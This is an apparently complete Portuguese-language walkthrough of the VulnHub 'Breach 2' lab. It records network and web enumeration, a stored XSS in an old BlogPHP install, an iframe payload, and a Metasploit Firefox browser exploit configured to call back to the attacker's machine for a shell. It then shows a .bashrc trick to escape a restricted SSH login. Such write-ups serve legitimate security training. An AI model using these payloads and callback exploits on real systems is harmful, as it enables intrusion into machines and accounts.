---
title: "VulnHub - Breach 2"
tags: [Linux, Medium]
categories: VulnHub
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/inicial.png)

Link: [Breach 2](https://www.vulnhub.com/entry/breach-21,159/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.110.100/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/nmap.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas aberta no servidor

> Porta 111 e 48036 -> RPC

> Porta 65535 -> SSH?

## Enumeração da Porta 65535

Se é ssh, vamos tentar conectar nela pra ver se tem algum banner ou algo assim

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/ssh.png)

Realmente tem um banner, descobrimos que temos um usuário **peter** e a senha está no código fonte de alguma coisa...

Fiquei um bom tempo quebrando a cabeça com isso, até que li o banner com mais atenção...

**Peter, if that's you - the password is in the source.**

Password é inthesource... sim é isso mesmo, tentamos nos conectar e já é resetada a conexão

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/ssh1.png)

Contudo a porta 80 é aberta...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/nmap2.png)

## Enumeração da Porta 80

Bom, acessamos ela pra ver então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/web.png)

Rodamos o gobuster

```bash
gobuster dir -u http://192.168.110.151 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/gobuster.png)

### /images

Acessamos pra ver o que tem nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/img.png)

Forbidden... Gobuster nele

```bash
gobuster dir -u http://192.168.110.151/images -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/img1.png)

### /blog

Acessamos o blog pra ver o que tem nele também

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/blog.png)

Verificamos que é bem antiga a versão dele, então é possível que encontremos exploits pra ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/antigo.png)

Pesquisamos...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/exp.png)

Encontramos!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/exp1.png)

## BlogPHP

[Exploit](https://www.exploit-db.com/exploits/17640)

```
How to exploit:
1- Go there : http://localhost/blogphp/register.html.
2- Put in the Username field the XSS Code.  Example:<META http-equiv="refresh" content="0;URL=http://www.google.com">  .
3- Put anything in the other field ( Password & E-mail).
4- Now anyone go there : http://localhost/blogphp/members.html will redirected to google.com OR exploit your XSS Code.
```

### Testando XSS

Então vamos verificar se esse exploit está valendo para essa aplicação

```
<META http-equiv="refresh" content="0;URL=http://192.168.110.102">
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/teste.png)

Acessamos o member.html e realmente temos o XSS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/teste1.png)

Verificamos que o navegador que está executando isso lá é um Firefox 5.0, extremamante antigo, temos exploits para RCE nele

### Firefox 15.0

Encontramos esse exploit [ExploitDB](https://www.exploit-db.com/exploits/30474)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/firefox.png)

Criamos um novo usuário com o nome

```
<iframe src="http://192.168.110.103"></iframe>
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/firefox2.png)

Setamos as opções no msfconsole

```
msfconsole -q
use exploit/multi/browser/firefox_proto_crmfrequest
set lhost 192.168.110.103
set lport 55135
set srvhost 192.168.110.103
set uripath /
set srvport 80
run
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/firefox3.png)

Depois de um tempo...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/firefox4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/firefox5.png)

Fazemos o upgrade para meterpreter

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/firefox6.png)

### Por que não conecta ssh?

Verificamos no /etc/sshd_config a resposta para isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/ssh2.png)

# Peter

Bom, para pegarmos um shell é simples

Devemos adicionar no .bashrc o sh

```bash
echo "exec sh" > .bashrc
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/ssh3.png)

Agora logamos via ssh e temos um shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/ssh4.png)

## Linpeas

Rodamos o linpeas para encontrar alguma coisa interessante para nossa escalação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/lin.png)

Baixamos para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/lin1.png)

Executamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/lin2.png)

Encontramos algumas portas locais abertas que nos chamaram atenção

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/lin3.png)

## Porta 2323

Verificamos o que tem nessa porta 2323

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/coord.png)

Pareceu uma coordenada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-breach2/coorf1.png)

Realmente, é da cidade de houston